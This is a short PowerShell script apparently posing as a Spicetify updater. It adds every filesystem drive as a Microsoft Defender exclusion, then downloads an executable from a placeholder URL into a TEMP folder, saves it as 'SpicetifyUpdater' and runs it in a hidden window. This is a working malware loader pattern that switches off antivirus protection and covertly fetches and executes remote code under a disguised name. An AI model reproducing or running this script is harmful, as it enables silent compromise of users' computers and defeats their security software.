$disks = Get-PSDrive -PSProvider FileSystem | Select-Object -ExpandProperty Name

foreach ($disk in $disks) {
    $path = "$disk:\"
    Add-MpPreference -ExclusionPath $path
}

$tempPath = "$env:TEMP\Spicetify"
New-Item -ItemType Directory -Path $tempPath -Force | Out-Null
$exeUrl = "http://example.com/path/to/exe.exe"
$exePath = "$tempPath\SpicetifyUpdater"
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath

Start-Process $exePath -WindowStyle Hidden
